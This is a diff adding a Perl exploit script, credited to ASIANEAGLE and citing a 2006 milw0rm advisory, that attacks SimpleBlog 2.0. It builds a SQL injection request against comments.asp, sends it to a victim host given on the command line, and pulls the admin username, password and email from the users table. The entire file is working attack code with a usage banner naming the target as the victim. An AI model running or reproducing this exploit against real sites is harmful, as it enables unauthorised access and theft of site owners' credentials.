@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+#Method found by Chironex Fleckeri 
+#Exploit By ASIANEAGLE
+#Contact:admin@asianeagle.org
+#Original advisory: http://www.milw0rm.com/exploits/2228
+#Usage: exploitname.pl <host> <path> <id>
+use IO::Socket;
+if(@ARGV != 3) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print " *****SimpleBlog 2.0 SQL Injection Exploit***** \r\n";
+  print "      *****www.asianeagle.org***** \r\n";
+  }
+sub usage() 
+{
+  header();
+  print " *Usage: $0 <host> <path> <id>\r\n";
+  print " *<host> = Victim's host ex: www.site.com\r\n";
+  print " *<path> = SimpleBlog Path ex: /SimpleBlog/\r\n";
+  print " *<id>   = Admin ID ex: 1\r\n";
+  exit();
+}
+sub exploit () 
+{
+  $simserver = $ARGV[0];
+  $simserver =~ s/(http:\/\/)//eg;
+  $simhost   = "http://".$simserver;
+  $simdir    = $ARGV[1];
+  $simport   = "80";
+  $simtar    = "comments.asp?id=";
+  $simsql    = "-1%20UNION%20SELECT%20ID,uFULLNAME,uUSERNAME,uPASSWORD,uEMAIL,uDATECREATED,null,null%20FROM%20T_USERS%20WHERE%20id%20like%20".$ARGV[2];
+  $simreq    = $simhost.$simdir.$simtar.$simsql;
+ 
+  header();
+  print "- Trying to connect: $simserver\r\n";
+  $sim = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$simserver", PeerPort => "$simport") || die "- Connection failed...\n";
+  print $sim "GET $simreq HTTP/1.1\n";
+  print $sim "Accept: */*\n";
+  print $sim "Referer: $simhost\n";
+  print $sim "Accept-Language: tr\n";
+  print $sim "User-Agent: Mozzilla\n";
+  print $sim "Cache-Control: no-cache\n";
+  print $sim "Host: $simserver\n";
+  print $sim "Connection: close\n\n";
+  print "Connected...\r\n";
+  while ($answer = <$sim>) {
+    if ($answer =~ /class=\"c_content\">(.*?)<\/td><\/tr>/) { 
+      if ($1 == $ARGV[2]) {
+        print "Seems Vulnerable :)\r\n";
+      }
+      else { die "- Exploit failed\n"; }     
+    }
+    if ($answer =~ /class=\"c_content\"><b>(.*)<\/b>/) {
+      print "- Username: $1\r\n";
+    }
+    if ($answer =~ /href=\"mailto:(.*?)\">(.*?)<\/a>/) {
+	  print "- Password: $1\r\n";
+    }  
+  }
+  
+ 
+ 
+}
+
+# milw0rm.com [2006-08-20]
